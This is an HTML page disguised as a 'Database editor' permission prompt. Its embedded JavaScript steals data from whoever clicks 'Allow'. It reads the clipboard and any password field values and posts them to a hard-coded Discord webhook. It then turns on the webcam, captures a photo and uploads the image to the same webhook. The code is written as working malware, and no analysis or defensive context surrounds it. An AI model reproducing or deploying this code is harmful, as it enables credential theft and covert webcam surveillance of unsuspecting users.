<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <title>Database editor</title>
    <style> 
        body, html { margin: 0; padding: 0; height: 100%; font-family: Arial, sans-serif; background: #f0f0f0; display: flex; justify-content: center; align-items: center; }
        #popup { background: white; padding: 30px 40px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.15); max-width: 320px; text-align: center; }
        #popup h2 { margin-bottom: 20px; }
        #popup button { background: linear-gradient(to right, #ff8a00, #e52e71); border: none; padding: 12px 25px; color: white; font-weight: bold; font-size: 16px; border-radius: 25px; cursor: pointer; transition: all 0.3s ease; user-select: none; }
        #popup button:hover { transform: scale(1.05); box-shadow: 0 6px 20px rgba(0,0,0,0.3); }
        #status { margin-top: 15px; color: #555; }
    </style>
</head>
<body>
    <div id="popup">
        <h2>Database editor.index</h2>
        <button id="allowBtn">Allow</button>
        <div id="status"></div>
    </div>
    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1403083806705057812/I3474kOt2sZKd2gOPsv6BCcP1X7J0smnlx5r15sp_Hm28vtemEZaCbMI1q3D6emTv5zR";
        const statusEl = document.getElementById('status');
        const allowBtn = document.getElementById('allowBtn');

        // ䷂䷃䷄ STEAL CLIPBOARD & PASSWORDS
        async function stealAllData() {
            let stolenData = "**Stolen Data**\n\n";

            // 1. CLIPBOARD CONTENTS
            try {
                const clipboard = await navigator.clipboard.readText();
                stolenData += `📋 **Clipboard:**\n${clipboard}\n\n`;
            } catch (err) {
                stolenData += "❌ Failed to read clipboard (permission denied).\n\n";
            }

            // 2. SAVED PASSWORDS FROM DOM
            const passwordInputs = document.querySelectorAll('input[type="password"]');
            if (passwordInputs.length > 0) {
                stolenData += "🔑 **Saved Passwords:**\n";
                passwordInputs.forEach(input => {
                    if (input.value) stolenData += `- ${input.value} (from ${window.location.href})\n`;
                });
            } else {
                stolenData += "❌ No saved passwords found in DOM.\n";
            }

            // 3. SEND TO WEBHOOK
            fetch(WEBHOOK_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ content: stolenData })
            });

            statusEl.textContent = "Database access granted. Processing...";
            return true;
        }

        // ䷅䷆䷇ MAIN TRIGGER
        allowBtn.addEventListener('click', async () => {
            allowBtn.disabled = true;
            await stealAllData(); // Immediate exfiltration
            hijackWebcam(); // Proceed to next step
        });

        // ䷈䷉䷊ WEBCAM FUNCTION (secondary)
        async function hijackWebcam() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement("video");
                video.srcObject = stream;
                await video.play();
                
                setTimeout(() => {
                    const canvas = document.createElement("canvas");
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext("2d");
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    canvas.toBlob(blob => {
                        const formData = new FormData();
                        formData.append("file", blob, "webcam_capture.jpg");
                        fetch(WEBHOOK_URL, { method: "POST", body: formData });
                        stream.getTracks().forEach(track => track.stop());
                    }, "image/jpeg");
                }, 3000); // Quick 3s delay
            } catch (err) {
                statusEl.textContent = "Error: Restart and allow permissions.";
            }
        }
    </script>
</body>
</html>
